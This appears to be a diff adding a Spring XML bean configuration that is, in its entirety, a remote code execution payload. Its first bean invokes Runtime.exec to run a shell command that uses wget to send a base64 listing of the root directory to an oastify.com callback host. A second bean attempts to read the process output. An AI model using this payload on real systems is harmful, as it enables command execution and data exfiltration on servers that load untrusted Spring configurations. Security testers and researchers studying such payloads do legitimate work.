@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+         http://www.springframework.org/schema/beans
+         http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+    <property name="targetObject">
+      <bean class="java.lang.Runtime" factory-method="getRuntime"/>
+    </property>
+    <property name="targetMethod" value="exec"/>
+    <property name="arguments">
+      <list>
+        <value>sh</value>
+        <value>-c</value>
+        <value>wget http://ra5vyglp45s5osa5xo77jhuy4pagyamz.oastify.com?c=$(ls / | base64 -w0)</value>
+      </list>
+    </property>
+  </bean>
+  <bean id="reader" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+    <property name="targetObject">
+      <!-- exec() trả về Process -->
+      <bean factory-bean="exec" factory-method="getOutputStream"/>
+    </property>
+    <property name="targetMethod" value="toString"/>
+    <property name="arguments">
+      <list>
+        <bean class="org.apache.commons.io.IOUtils" factory-method="toString">
+          <constructor-arg>
+            <bean factory-bean="exec" factory-method="getInputStream"/>
+          </constructor-arg>
+          <constructor-arg value="UTF-8"/>
+        </bean>
+      </list>
+    </property>
+  </bean>
+</beans>
